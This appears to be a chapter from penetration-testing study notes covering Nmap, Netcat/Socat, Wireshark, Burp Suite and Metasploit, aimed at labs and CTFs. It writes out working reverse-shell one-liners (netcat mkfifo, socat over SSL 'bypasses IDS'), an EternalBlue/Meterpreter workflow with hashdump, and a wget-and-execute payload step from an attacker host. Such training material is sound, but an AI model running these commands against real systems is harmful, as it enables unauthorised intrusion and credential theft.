# Essential Tools Overview: The Pentagon of Power

---
title: "Essential Tools Overview"
parent: "[[01_Foundations]]"
tags:
  - foundations
  - tools
  - nmap
  - burp
  - metasploit
  - wireshark
  - netcat
created: 2026-01-23
updated: 2026-01-23
---

> **Executive Summary**: In the world of offensive security, there are thousands of tools on GitHub, but 90% of your time will be spent in just five applications. These are the "Pentagon of Power": **Nmap** for discovery, **Wireshark** for visibility, **Burp Suite** for web manipulation, **Metasploit** for exploitation, and **Netcat** for connectivity. Mastery of these five is the baseline requirement for any professional penetration tester.

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [Nmap: The God of Port Scanners](#2-nmap-the-god-of-port-scanners)
3. [Netcat & Socat: The Swiss Army Knives](#3-netcat--socat-the-swiss-army-knives)
4. [Wireshark: The Truth Source](#4-wireshark-the-truth-source)
5. [Burp Suite: The Web Proxy](#5-burp-suite-the-web-proxy)
6. [Metasploit Framework: The Cannon](#6-metasploit-framework-the-cannon)
7. [Tool Chaining: Integration Scenarios](#7-tool-chaining-integration-scenarios)
8. [Critical Analysis & Checkpoints](#8-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **Map Networks**: Perform stealthy, aggregated scans using Nmap's timing templates and output formats.
- **Manipulate Connections**: manually craft raw HTTP requests and establish encrypted reverse shells using Netcat and Socat.
- **Analyze Traffic**: Extract files and credentials from raw PCAP data using Wireshark filters.
- **Intercept Web**: Configure browser certificate authorities to inspect HTTPS traffic with Burp Suite.
- **Manage Exploits**: Use the Metasploit database to track vulnerabilities and manage sessions across multiple targets.

---

## 2. Nmap: The God of Port Scanners

Network Mapper (Nmap) is not just a port scanner; it is a network interrogation tool.

### 2.1 The Scan Lifecycle
When you run `nmap target`, it performs these steps:
1.  **DNS Resolution**: Resolves hostname to IP. (Use `-n` to skip).
2.  **Host Discovery (Ping)**: Checks if the host is alive. (Use `-Pn` to skip/assume alive).
3.  **Reverse DNS**: Resolves IP to hostname for logging.
4.  **Port Scan**: Sends packets to ports to determine state.
5.  **Service Version Detection (-sV)**: Interrogates open ports.
6.  **OS Detection (-O)**: Guesses OS based on TCP/IP stack behavior.
7.  **Script Scanning (-sC)**: Runs Lua scripts against services.
8.  **Output**: Writes results.

### 2.2 Port States
Understanding the output is critical.
- **Open**: Application is listening. Syn-Ack received.
- **Closed**: Host is alive, but no application is listening. Reset (RST) received.
- **Filtered**: Firewall is dropping packets. No response received.
- **Unfiltered**: ACK scan determines port is accessible, but state is unknown.

### 2.3 Key Scan Types

#### SYN Scan (`-sS`) - The Default
- **Mechanism**: Send SYN. Receive SYN-ACK. Send RST.
- **Pros**: Fast. Stealthy (App doesn't log connection).
- **Cons**: Requires Root (`sudo`).

#### Connect Scan (`-sT`) - The Fallback
- **Mechanism**: Send SYN. Receive SYN-ACK. Send ACK. (Full Handshake).
- **Pros**: No Root required. Works through Proxychains.
- **Cons**: Slow. Noisy (App logs connection).

#### UDP Scan (`-sU`) - The Forgotten
- **Mechanism**: Send empty UDP packet.
    - Response (Data): Open.
    - Response (ICMP Port Unreachable): Closed.
    - No Response: Open|Filtered (Firewall dropped it OR packet was lost).
- **Pros**: Finds DNS (53), SNMP (161), TFTP (69).
- **Cons**: Extremely slow.

### 2.4 Timing & Performance
Nmap allows timing templates (`-T0` to `-T5`).
- `-T0` (Paranoid): One packet every 5 minutes.
- `-T1` (Sneaky): Evasion.
- `-T2` (Polite): Slows down to not crash target.
- `-T3` (Normal): Default.
- `-T4` (Aggressive): Recommended for CTFs/Labs.
- `-T5` (Insane): Can miss ports due to speed.

### 2.5 The "Default" Command
This is the command you will run 90% of the time:
```bash
sudo nmap -sC -sV -O -oA output_name 192.168.1.10
```
- `-sC`: Default Scripts (Safe scripts).
- `-sV`: Version detection.
- `-O`: OS Detection.
- `-oA`: Output All formats (XML, Nmap, Grepable).

### 2.6 Nmap Scripting Engine (NSE)
Nmap uses Lua scripts to interact with services.
- Location: `/usr/share/nmap/scripts/`
- Categories:
    - `safe`: Won't crash target.
    - `intrusive`: Risky.
    - `vuln`: Checks for vulnerabilities (CVEs).
    - `exploit`: Actually exploits.
    - `auth`: Checks default creds.

**Example**: Vulnerability Scan
```bash
nmap --script vuln 192.168.1.10
```

---

## 3. Netcat & Socat: The Swiss Army Knives

If Nmap is the radar, Netcat is the grappling hook.

### 3.1 Netcat (`nc`) Basics

**Client Mode (Connect)**:
```bash
nc 192.168.1.50 80
GET / HTTP/1.0
```

**Server Mode (Listen)**:
```bash
nc -lvnp 4444
```
- `-l`: Listen.
- `-v`: Verbose.
- `-n`: No DNS (Faster).
- `-p`: Port.

### 3.2 File Transfer
**Scenario**: You have RCE on a Linux victim but no SSH. You need to upload an exploit.

**Receiver (Victim)**:
```bash
nc -lvnp 4444 > exploit.py
```

**Sender (Attacker)**:
```bash
nc -w 3 192.168.1.50 4444 < exploit.py
```
- `-w 3`: Wait 3 seconds after EOF to close connection.

### 3.3 The Reverse Shell
The holy grail.
**Attacker**: `nc -lvnp 4444`
**Victim**:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

### 3.4 Socat: Netcat on Steroids
Socat works on streams/addresses. It is bidirectional and supports SSL/Encryption.

**Encrypted Reverse Shell (Bypasses IDS)**:
1.  **Attacker (Generate Key)**:
    ```bash
    openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
    cat bind_shell.key bind_shell.crt > bind_shell.pem
    ```
2.  **Attacker (Listen)**:
    ```bash
    sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 -
    ```
3.  **Victim (Connect)**:
    ```bash
    socat OPENSSL:10.10.14.5:443,verify=0 EXEC:/bin/bash
    ```

**Port Forwarding**:
Forward traffic from local 8080 to target 80.
```bash
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80
```

---

## 4. Wireshark: The Truth Source

Packets don't lie. Logs can be deleted, UIs can be deceptive, but the wire is the truth.

### 4.1 Interface & Capture
- **Promiscuous Mode**: Ensure this is enabled to see traffic not destined for your MAC.
- **Capture Filters**: Set *before* capturing (uses BPF syntax).
    - `host 192.168.1.50`: Only this IP.
    - `port 80`: Only HTTP.
    - `net 192.168.1.0/24`: Subnet.

### 4.2 Display Filters
Set *after* capturing.
- **IP Filtering**: `ip.addr == 192.168.1.50`
- **Protocol**: `http` or `dns` or `smb2`
- **Port**: `tcp.port == 445`
- **Content**: `frame contains "password"`
- **HTTP Method**: `http.request.method == "POST"`

### 4.3 Following Streams
Right-click a packet -> **Follow** -> **TCP Stream**.
This reassembles the fragmented packets into a readable conversation.
- **Red**: Client -> Server.
- **Blue**: Server -> Client.
- **Use Case**: Reading HTML source, seeing login credentials in cleartext.

### 4.4 Extracting Objects
Wireshark can carve files out of the stream.
- **File** -> **Export Objects** -> **HTTP** (or SMB).
- **Use Case**: You captured a malware download. Export the `.exe` to analyze it.

---

## 5. Burp Suite: The Web Proxy

Burp Suite sits between your browser and the web server.

### 5.1 Architecture
- **Proxy Listener**: Usually `127.0.0.1:8080`.
- **Browser Config**: Configure Firefox to use this proxy.
- **CA Certificate**: You must install Burp's CA cert (`http://burp`) into Firefox to intercept HTTPS without errors.

### 5.2 The Repeater
The most used tab.
1.  Capture a request in Proxy.
2.  `Ctrl + R` (Send to Repeater).
3.  Modify parameters (e.g., change `id=1` to `id=1'`).
4.  Send.
5.  Analyze Response.
6.  Repeat.

### 5.3 The Intruder
Automation for brute-forcing.
**Attack Types**:
1.  **Sniper**: Single payload set. Replaces one position at a time. (Fuzzing parameters).
2.  **Battering Ram**: Single payload set. Replaces all positions with the same payload.
3.  **Pitchfork**: Multiple payload sets. Iterates simultaneously (User1/Pass1, User2/Pass2).
4.  **Cluster Bomb**: Multiple payload sets. Iterates every permutation (User1/Pass1, User1/Pass2...).

### 5.4 The Decoder
Built-in tool for URL, Base64, Hex, and HTML encoding/decoding.
- **Smart Decode**: Attempts to guess the format.

---

## 6. Metasploit Framework: The Cannon

Metasploit (MSF) is a massive framework for developing and executing exploit code.

### 6.1 Architecture
- **Exploits**: Code that triggers a vulnerability (Buffer Overflow).
- **Payloads**: Code that runs *after* the exploit (Reverse Shell).
- **Auxiliary**: Scanners, Fuzzers, Dos (No payload).
- **Post**: Post-exploitation modules (Hash dumping).
- **Encoders**: Obfuscate payloads to bypass AV.
- **NOPs**: No-Operation instructions for padding.

### 6.2 The Database
Always start postgresql before msfconsole.
```bash
sudo systemctl start postgresql
sudo msfdb init
sudo msfconsole
```
**Benefits**:
- `db_nmap`: Runs nmap and saves results to database.
- `hosts`: Lists found hosts.
- `services`: Lists found services.
- `vulns`: Lists discovered vulnerabilities.

### 6.3 Usage Workflow
1.  **Search**: `search eternalblue`
2.  **Select**: `use exploit/windows/smb/ms17_010_eternalblue`
3.  **Configure**: `show options`
    - `set RHOSTS 192.168.1.50`
    - `set LHOST tun0`
4.  **Payload**: `set payload windows/x64/meterpreter/reverse_tcp`
5.  **Run**: `exploit` or `run`

### 6.4 Meterpreter
The advanced payload. It runs in memory (DLL injection) and provides powerful commands:
- `sysinfo`: System details.
- `getuid`: Current user.
- `getsystem`: Attempt privesc to SYSTEM.
- `hashdump`: Dump local hashes.
- `upload`/`download`: File transfer.
- `shell`: Drop to standard CMD shell.

### 6.5 Handler (`multi/handler`)
If you use a standalone payload (like `msfvenom`), use this generic listener.
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

---

## 7. Tool Chaining: Integration Scenarios

Real hacking is not "use tool X". It is "use tool X to feed tool Y".

### Scenario: The Web Shell to Meterpreter Upgrade
1.  **Burp Suite**: Found file upload. Uploaded PHP shell.
2.  **Netcat**: Triggered shell via curl. Caught callback on port 9001. `whoami` -> `www-data`.
3.  **Metasploit (Upgrade)**:
    - Create payload: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=... -f elf -o shell.elf`
    - Start `multi/handler` on port 4444.
    - **Netcat**: `wget http://attacker/shell.elf` (Hosted via `python http.server`).
    - **Netcat**: `chmod +x shell.elf && ./shell.elf`
4.  **Metasploit**: Session 1 opened. Now you have Meterpreter features.

---

## 8. Critical Analysis & Checkpoints

### 8.1 Common Pitfalls
- **Over-reliance on Metasploit**: It is noisy and often banned in exams/engagements. Learn to exploit manually.
- **Nmap Aggression**: Running `-T4` on an unstable industrial network (OT/ICS) can crash PLCs. Use `-T2`.
- **Tunnel Vision**: Ignoring UDP. DNS (53) and SNMP (161) often hold the keys to the kingdom.

### 8.2 Checkpoint Questions
1.  **Nmap**: What is the difference between Open, Closed, and Filtered?
    - *Answer*: Open = App listening. Closed = OS listening (RST). Filtered = No response (Firewall).
2.  **Netcat**: Why does `nc -e /bin/bash` often fail?
    - *Answer*: The `-e` flag (execute) is considered a security risk and is compiled out of most modern Linux distributions (OpenBSD netcat).
3.  **Metasploit**: What is the difference between a Staged and Non-Staged payload?
    - *Answer*: **Staged** (`shell/reverse_tcp`) sends a tiny stub that downloads the rest. Good for size constraints. **Non-Staged** (`shell_reverse_tcp`) sends the whole shell at once. More stable, but larger.

### 8.3 Final Thoughts
These five tools are the foundation. Every other tool you learn is likely a specialized version of one of these (e.g., `feroxbuster` is just a specialized HTTP requester like Burp Intruder). Master the principles of these five, and you master the trade.

---
*End of Chapter 04*
